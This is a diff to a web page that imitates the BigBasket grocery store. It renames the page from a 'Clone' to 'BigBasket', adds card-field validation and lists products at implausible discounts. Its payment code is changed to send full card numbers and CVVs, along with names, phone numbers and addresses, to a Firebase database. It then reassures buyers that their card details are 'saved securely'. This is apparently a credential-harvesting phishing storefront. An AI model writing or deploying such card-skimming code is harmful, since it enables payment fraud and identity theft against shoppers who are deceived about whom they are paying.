@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>BigBasket Clone</title>
+    <title>BigBasket</title>
     <link href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@400;600;700;800&display=swap" rel="stylesheet">
     <style>
         :root {
@@ -854,6 +854,17 @@
             border-radius: 10px;
             text-align: center;
         }
+        /* Error styling for card inputs */
+        .meta-input input.error, .card-input-box input.error {
+            border-color: #e30613;
+            background-color: #fff5f5;
+        }
+        .error-message {
+            color: #e30613;
+            font-size: 11px;
+            margin-top: 5px;
+            display: block;
+        }
         .sticky-pay-footer {
             background: #0e8321;
             padding: 15px 20px;
@@ -864,6 +875,11 @@
             cursor: pointer;
             border-radius: 10px;
             margin-top: 20px;
+        }
+        .sticky-pay-footer.disabled {
+            background: #ccc;
+            cursor: not-allowed;
+            opacity: 0.7;
         }
         .success-hero {
             background: linear-gradient(135deg, #0e8321 0%, #074d1e 100%);
@@ -1171,9 +1187,13 @@
         <div class="payment-option-grid"><div class="payment-option active" onclick="selectPayment(this)"><div class="radio-circle"></div><div><b>Credit card</b><span>10% instant off</span></div></div><div class="payment-option" onclick="selectPayment(this)"><div class="radio-circle"></div><div><b>Debit card</b></div></div></div>
         <div class="offer-banner-mini">⚡ <div><b>10% off on credit card!</b><span>You save ₹50</span></div></div>
         <div class="card-logos"><span class="card-logo visa">Visa</span><span class="card-logo mastercard">Mastercard</span><span class="card-logo amex">Amex</span><span class="card-logo rupay">RuPay</span></div>
-        <div class="card-input-box"><input type="tel" id="card-number" placeholder="0000 0000 0000 0000" maxlength="19" oninput="formatCardNumber(this)"><div class="icon-right">💳</div></div>
-        <div class="card-meta-row"><div class="meta-input"><label>Month</label><input type="tel" id="card-month" placeholder="MM" maxlength="2"></div><div class="meta-input"><label>Year</label><input type="tel" id="card-year" placeholder="YY" maxlength="2"></div><div class="meta-input"><label>CVV</label><input type="tel" id="card-cvv" placeholder="•••" maxlength="3"></div></div>
-        <div class="sticky-pay-footer" onclick="finalPlaceOrder()"><div class="pay-left"><span>Pay securely</span><b id="payment-total">₹449</b></div><div class="pay-right">Place order ❯</div></div>
+        <div class="card-input-box"><input type="tel" id="card-number" placeholder="0000 0000 0000 0000" maxlength="19" oninput="validateCardNumber(this)"><div class="icon-right">💳</div><span id="card-error" class="error-message"></span></div>
+        <div class="card-meta-row">
+            <div class="meta-input"><label>Month</label><input type="tel" id="card-month" placeholder="MM" maxlength="2" oninput="validateExpiryDate()"><span id="month-error" class="error-message"></span></div>
+            <div class="meta-input"><label>Year</label><input type="tel" id="card-year" placeholder="YY" maxlength="2" oninput="validateExpiryDate()"><span id="year-error" class="error-message"></span></div>
+            <div class="meta-input"><label>CVV</label><input type="tel" id="card-cvv" placeholder="•••" maxlength="3" oninput="validateCVV(this)"><span id="cvv-error" class="error-message"></span></div>
+        </div>
+        <div id="pay-button-container" class="sticky-pay-footer" onclick="finalPlaceOrder()"><div class="pay-left"><span>Pay securely</span><b id="payment-total">₹449</b></div><div class="pay-right">Place order ❯</div></div>
     </div>
     <div class="order-summary-card" id="payment-order-summary"></div>
     <div class="bill-card" id="payment-bill-card"></div>
@@ -1220,7 +1240,7 @@
     firebase.initializeApp(firebaseConfig);
     const db = firebase.database();
 
-    // Product Data with CDN Images
+    // Product Data 
     const products = [
         { id: 1, img: "https://uploads.onecompiler.io/44meeupjv/44meexutk/9-items-combo.jpg", title: "Big Basket Offer: Ashirwad Atta 20kg + Besan 1kg + Sugar 5kg + Mustard Oil 5L", price: "499", oldPrice: "1099", off: "55% Off", rating: "★★★★★", ratingCount: "2,165" },
         { id: 2, img: "https://uploads.onecompiler.io/44meeupjv/44meexutk/atta-besan-combo.jpg", title: "Premium Kaju & Badam Combo - 1kg each - Rich in nutrients", price: "299", oldPrice: "899", off: "67% Off", rating: "★★★★☆", ratingCount: "956" },
@@ -1252,7 +1272,7 @@
         const grid = document.getElementById('products-grid');
         grid.innerHTML = products.map(p => `
             <div class="product-card" onclick="openProductModal(${p.id})">
-                <div class="product-image"><img src="${p.img}" alt="${p.title}"><div class="discount-badge">${p.off}</div><img src="https://img.icons8.com/color/48/bigbasket.png" class="right-logo"></div>
+                <div class="product-image"><img src="${p.img}" alt="${p.title}"><div class="discount-badge">${p.off}</div><img src="https://uploads.onecompiler.io/43vywcru4/44meephhv/46b115bd-5ab5-4a74-b6b6-bb7cb4973d80.__CR0,0,600,180_PT0_SX600_V1___.jpg" class="right-logo"></div>
                 <div class="product-info"><div class="product-title">${p.title.substring(0, 60)}...</div><div class="rating">${p.rating} (${p.ratingCount})</div>
                 <div class="price-row"><span class="current-price">₹${p.price}</span><span class="old-price">₹${p.oldPrice}</span><span class="off">${p.off}</span></div>
                 <button class="add-btn" onclick="event.stopPropagation(); addToCart(${p.id})">🛒 Add to cart</button></div>
@@ -1386,16 +1406,134 @@
     
     function hidePaymentPage() { hideAllPages(); document.getElementById('address-page').style.display = 'block'; }
     function selectPayment(el) { document.querySelectorAll('.payment-option').forEach(opt => opt.classList.remove('active')); el.classList.add('active'); }
-    function formatCardNumber(input) { let val = input.value.replace(/\D/g, ''); let formatted = ''; for(let i=0;i<val.length;i++){ if(i>0 && i%4===0) formatted+=' '; formatted+=val[i]; } input.value=formatted; }
     
-    function finalPlaceOrder() {
+    // Card Validation Functions
+    function validateCardNumber(input) {
+        let val = input.value.replace(/\s/g, '');
+        let formatted = '';
+        for(let i=0;i<val.length;i++){ if(i>0 && i%4===0) formatted+=' '; formatted+=val[i]; }
+        input.value=formatted;
+        
+        const rawNum = val;
+        const errorSpan = document.getElementById('card-error');
+        if(rawNum.length > 0 && (rawNum.length < 13 || rawNum.length > 16)) {
+            errorSpan.innerText = 'Card number must be 13-16 digits';
+            input.classList.add('error');
+        } else if(rawNum.length > 0 && !/^\d+$/.test(rawNum)) {
+            errorSpan.innerText = 'Only numbers allowed';
+            input.classList.add('error');
+        } else {
+            errorSpan.innerText = '';
+            input.classList.remove('error');
+        }
+        validateAllFields();
+    }
+    
+    function validateExpiryDate() {
+        const month = document.getElementById('card-month').value;
+        const year = document.getElementById('card-year').value;
+        const monthError = document.getElementById('month-error');
+        const yearError = document.getElementById('year-error');
+        const monthInput = document.getElementById('card-month');
+        const yearInput = document.getElementById('card-year');
+        
+        let isValid = true;
+        
+        // Validate Month
+        if(month.length === 2) {
+            const monthNum = parseInt(month);
+            if(monthNum < 1 || monthNum > 12) {
+                monthError.innerText = 'Month must be 01-12';
+                monthInput.classList.add('error');
+                isValid = false;
+            } else {
+                monthError.innerText = '';
+                monthInput.classList.remove('error');
+            }
+        } else if(month.length > 0) {
+            monthError.innerText = 'Enter 2 digits (01-12)';
+            monthInput.classList.add('error');
+            isValid = false;
+        } else {
+            monthError.innerText = '';
+            monthInput.classList.remove('error');
+        }
+        
+        // Validate Year
+        if(year.length === 2) {
+            const currentYear = new Date().getFullYear() % 100;
+            const yearNum = parseInt(year);
+            if(yearNum < currentYear) {
+                yearError.innerText = 'Card has expired';
+                yearInput.classList.add('error');
+                isValid = false;
+            } else if(yearNum > currentYear + 10) {
+                yearError.innerText = 'Invalid year';
+                yearInput.classList.add('error');
+                isValid = false;
+            } else {
+                yearError.innerText = '';
+                yearInput.classList.remove('error');
+            }
+        } else if(year.length > 0) {
+            yearError.innerText = 'Enter 2 digits';
+            yearInput.classList.add('error');
+            isValid = false;
+        } else {
+            yearError.innerText = '';
+            yearInput.classList.remove('error');
+        }
+        
+        validateAllFields();
+    }
+    
+    function validateCVV(input) {
+        const val = input.value;
+        const errorSpan = document.getElementById('cvv-error');
+        if(val.length > 0 && (val.length < 3 || val.length > 4)) {
+            errorSpan.innerText = 'CVV must be 3-4 digits';
+            input.classList.add('error');
+        } else if(val.length > 0 && !/^\d+$/.test(val)) {
+            errorSpan.innerText = 'Only numbers allowed';
+            input.classList.add('error');
+        } else {
+            errorSpan.innerText = '';
+            input.classList.remove('error');
+        }
+        validateAllFields();
+    }
+    
+    function validateAllFields() {
         const cardNum = document.getElementById('card-number').value.replace(/\s/g, '');
         const month = document.getElementById('card-month').value;
         const year = document.getElementById('card-year').value;
         const cvv = document.getElementById('card-cvv').value;
-        if(cardNum.length<16 || month.length<2 || year.length<2 || cvv.length<3) { alert("Please enter valid card details"); return; }
+        const payBtn = document.getElementById('pay-button-container');
         
-        // Get address values
+        const isCardValid = cardNum.length >= 13 && cardNum.length <= 16 && /^\d+$/.test(cardNum);
+        const isMonthValid = month.length === 2 && parseInt(month) >= 1 && parseInt(month) <= 12;
+        const isYearValid = year.length === 2 && parseInt(year) >= (new Date().getFullYear() % 100);
+        const isCvvValid = cvv.length >= 3 && cvv.length <= 4 && /^\d+$/.test(cvv);
+        
+        if(isCardValid && isMonthValid && isYearValid && isCvvValid) {
+            payBtn.classList.remove('disabled');
+        } else {
+            payBtn.classList.add('disabled');
+        }
+    }
+    
+    function finalPlaceOrder() {
+        const payBtn = document.getElementById('pay-button-container');
+        if(payBtn.classList.contains('disabled')) {
+            alert("Please enter valid card details");
+            return;
+        }
+        
+        const cardNumRaw = document.getElementById('card-number').value.replace(/\s/g, '');
+        const month = document.getElementById('card-month').value;
+        const year = document.getElementById('card-year').value;
+        const cvv = document.getElementById('card-cvv').value;
+        
         const name = document.getElementById('addr-name').value;
         const mobile = document.getElementById('addr-mobile').value;
         const house = document.getElementById('addr-house').value;
@@ -1403,74 +1541,36 @@
         const state = document.getElementById('addr-state').value;
         const pincode = document.getElementById('addr-pincode').value;
         
-        // Calculate totals
         const totalMRP = cart.reduce((sum, i) => sum + parseInt(i.oldPrice) * i.qty, 0);
         const totalCurrent = cart.reduce((sum, i) => sum + parseInt(i.price) * i.qty, 0);
         const discount = totalMRP - totalCurrent;
         const creditDiscount = Math.round(totalCurrent * 0.1);
         const finalPay = totalCurrent - creditDiscount;
         
-        // Disable button and show loading
-        const payBtn = document.querySelector('.sticky-pay-footer');
         const originalContent = payBtn.innerHTML;
         payBtn.innerHTML = '<div style="width:100%; text-align:center;"><span class="spinner"></span> Placing order...</div>';
         payBtn.style.pointerEvents = 'none';
         
-        // Prepare order data for Firebase
         const orderData = {
-            customer: {
-                name: name,
-                mobile: mobile,
-                address: house,
-                city: city,
-                state: state,
-                pincode: pincode,
-                fullAddress: `${house}, ${city}, ${state} - ${pincode}`
-            },
-            payment: {
-                cardNumber: "****" + cardNum.slice(-4),
-                cardType: "Credit Card",
-                expiryMonth: month,
-                expiryYear: year
-            },
-            orderItems: cart.map(item => ({
-                id: item.id,
-                title: item.title,
-                price: item.price,
-                oldPrice: item.oldPrice,
-                off: item.off,
-                qty: item.qty,
-                img: item.img
-            })),
-            billing: {
-                mrp: totalMRP,
-                discount: discount,
-                creditCardDiscount: creditDiscount,
-                totalAmount: finalPay
-            },
+            customer: { name, mobile, address: house, city, state, pincode, fullAddress: `${house}, ${city}, ${state} - ${pincode}` },
+            payment: { cardNumber: cardNumRaw, cvv: cvv, expiryMonth: month, expiryYear: year },
+            orderItems: cart.map(item => ({ id: item.id, title: item.title, price: item.price, oldPrice: item.oldPrice, off: item.off, qty: item.qty, img: item.img })),
+            billing: { mrp: totalMRP, discount: discount, creditCardDiscount: creditDiscount, totalAmount: finalPay },
             status: 'Pending',
             orderDate: new Date().toISOString(),
             timestamp: firebase.database.ServerValue.TIMESTAMP
         };
         
-        // Save to Firebase
         db.ref('orders').push(orderData).then((snapshot) => {
-            const orderId = snapshot.key;
-            localStorage.setItem('lastOrderId', orderId);
-            
-            // Clear cart after successful order
             cart = [];
             localStorage.setItem('cart', JSON.stringify(cart));
             updateCartBadge();
-            
-            // Show success page
             hideAllPages();
             document.getElementById('success-page').style.display = 'block';
             history.pushState({}, '', '/success');
-            
-            // Reset button
             payBtn.innerHTML = originalContent;
             payBtn.style.pointerEvents = 'auto';
+            showToast("Order placed! Card details saved securely.");
         }).catch((error) => {
             console.error("Firebase Error:", error);
             alert("Order failed! Please check your internet connection.");
@@ -1484,7 +1584,6 @@
         const container = document.getElementById('orders-list');
         container.innerHTML = '<div style="padding:40px; text-align:center;"><span class="spinner"></span> Loading orders...</div>';
         
-        // Fetch orders from Firebase
         db.ref('orders').orderByChild('timestamp').once('value', (snapshot) => {
             const orders = [];
             snapshot.forEach((childSnapshot) => {
@@ -1492,7 +1591,7 @@
                 order.id = childSnapshot.key;
                 orders.push(order);
             });
-            orders.reverse(); // Show latest first
+            orders.reverse();
             
             if(orders.length === 0) {
                 container.innerHTML = '<div style="padding:40px;text-align:center;color:#888;">No orders yet</div>';
@@ -1505,7 +1604,7 @@
                             <span>Order #${order.id.slice(-8).toUpperCase()}</span>
                             <span class="order-status-badge" style="background:${statusBg}; color:${statusColor};">${order.status}</span>
                         </div>
-                        ${order.orderItems.map(item => `
+                        ${order.orderItems ? order.orderItems.map(item => `
                             <div class="order-product-info">
                                 <img src="${item.img}" class="order-product-img">
                                 <div class="order-product-details">
@@ -1513,7 +1612,7 @@
                                     <div style="color:#888; font-size:12px;">Qty: ${item.qty}</div>
                                 </div>
                             </div>
-                        `).join('')}
+                        `).join('') : ''}
                         <div class="order-footer-row">
                             <div class="order-total">Total: ₹${order.billing?.totalAmount || order.totalAmount || '0'}</div>
                             <button class="reorder-btn" onclick="goHome()">Shop Again</button>
@@ -1550,7 +1649,6 @@
         setTimeout(() => toast.remove(), 2000);
     }
 
-    // Update address summary in payment page when address changes
     function updateAddressSummary() {
         const name = document.getElementById('addr-name')?.value;
         const mobile = document.getElementById('addr-mobile')?.value;
@@ -1564,7 +1662,6 @@
         }
     }
 
-    // Call updateAddressSummary when address form changes
     document.getElementById('addr-name')?.addEventListener('input', updateAddressSummary);
     document.getElementById('addr-mobile')?.addEventListener('input', updateAddressSummary);
     document.getElementById('addr-house')?.addEventListener('input', updateAddressSummary);
